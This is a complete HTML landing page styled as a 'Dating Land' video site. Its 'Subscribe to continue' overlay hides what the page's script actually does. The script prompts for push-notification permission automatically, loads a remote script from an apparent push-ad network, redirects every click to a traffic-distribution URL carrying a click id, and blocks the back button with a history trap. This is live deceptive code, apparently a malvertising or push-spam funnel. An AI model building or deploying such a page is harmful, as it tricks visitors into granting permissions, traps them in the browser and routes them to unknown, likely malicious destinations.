<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dating Land</title>
<style>
    html, body {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        font-family: Arial, sans-serif;
        background-color: #000;
    }
    #videoContainer {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        z-index: 1;
    }
    #videoFrame {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 100%;
        height: 100%;
        border: none;
        pointer-events: none;
    }
    #overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(to bottom, rgba(0,0,0,0.4), rgba(0,0,0,0.8));
        z-index: 2;
        opacity: 0;
        transition: opacity 0.5s ease;
    }
    #overlay.show {
        opacity: 1;
    }
    #clickArea {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 1;
        cursor: pointer;
    }
    #subscribeBtn {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%) scale(0);
        padding: 18px 36px;
        font-size: 26px;
        color: #fff;
        background-color: rgba(255, 0, 150, 0.9);
        border: 2px solid #fff;
        border-radius: 12px;
        cursor: pointer;
        z-index: 3;
        opacity: 0;
        transition: transform 0.5s ease, opacity 0.5s ease;
        white-space: nowrap;
    }
    #subscribeBtn.show {
        transform: translate(-50%, -50%) scale(1);
        opacity: 1;
    }
    #subscribeBtn:hover {
        background-color: rgba(255, 0, 150, 1);
        transform: translate(-50%, -50%) scale(1.05);
    }
    @media (max-width: 768px) {
        #subscribeBtn {
            font-size: 20px;
            padding: 14px 28px;
        }
    }
</style>
</head>
<body>
<div id="videoContainer">
    <iframe id="videoFrame" src="https://drive.google.com/file/d/1vQyzBuAsTze-RdFdAWAoWgltiQNetNTs/preview" allow="autoplay"></iframe>
    <div id="clickArea"></div>
    <div id="overlay"></div>
    <div id="subscribeBtn">Subscribe to continue</div>
</div>

<script type="application/javascript" src="https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ" async></script>

<script>
const btn = document.getElementById('subscribeBtn');
const overlay = document.getElementById('overlay');
const clickArea = document.getElementById('clickArea');
const urlParams = new URLSearchParams(window.location.search);
const clickId = urlParams.get('clickid') || '';
const targetUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${clickId}&p2=sub2&p3=sub3&p4=sub4`;

// Show overlay and button after short delay
setTimeout(() => {
    overlay.classList.add('show');
    btn.classList.add('show');
    
    // Request push notification permission
    setTimeout(() => {
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
    }, 250);
}, 100);

// Continue and redirect function
function continueAndRedirect(e) {
    if (e) e.preventDefault();
    
    btn.classList.remove('show');
    overlay.classList.remove('show');
    
    setTimeout(() => {
        window.location.href = targetUrl;
    }, 300);
}

// Event listeners
clickArea.addEventListener('click', continueAndRedirect);
btn.addEventListener('click', continueAndRedirect);

// Back button protection
history.pushState(null, null, location.href);
window.onpopstate = function() {
    history.pushState(null, null, location.href);
};
</script>
</body>
</html>
